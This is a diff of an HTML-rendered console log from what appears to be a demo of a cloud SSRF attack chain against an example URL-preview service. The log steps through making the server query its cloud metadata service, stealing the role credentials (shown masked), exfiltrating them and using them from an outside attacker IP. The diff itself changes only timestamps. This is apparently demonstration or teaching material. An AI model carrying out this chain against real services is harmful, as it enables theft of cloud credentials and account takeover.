@@ -7,7 +7,7 @@ body{margin:0;background:#1e1e1e;font-family:Consolas,'Cascadia Mono',monospace;
 <span style="font-weight:bold">=== Cloud SSRF attack chain against http://linkpeek.example.com ===</span>
 
 <span style="font-weight:bold"><span style="color:#66d9e8">[STEP 1] Recon: use the URL-preview feature as a normal user</span></span>
-  fetch http://cdn.example.net/ -&gt; HTTP 200  (3.49 ms)
+  fetch http://cdn.example.net/ -&gt; HTTP 200  (7.16 ms)
   <span style="color:#ffd43b">=&gt; the server fetches any URL we give it: potential SSRF</span>
 
 <span style="font-weight:bold"><span style="color:#66d9e8">[STEP 2] SSRF: make the server read its own cloud metadata service</span></span>
@@ -20,7 +20,7 @@ body{margin:0;background:#1e1e1e;font-family:Consolas,'Cascadia Mono',monospace;
 <span style="font-weight:bold"><span style="color:#66d9e8">[STEP 4] Steal the role credentials</span></span>
   AccessKeyId     : ASIA************BBPI
   SecretAccessKey : 8p7Y********************************LAN/   (masked for the report)
-  Expiration      : 2026-11-20T23:13:07Z
+  Expiration      : 2026-11-26T02:58:08Z
   <span style="color:#ff6b6b">=&gt; credentials exfiltrated to the attacker&#x27;s machine</span>
 
 <span style="font-weight:bold"><span style="color:#66d9e8">[STEP 5] Use the stolen credentials from OUTSIDE the cloud (attacker IP 203.0.113.100)</span></span>
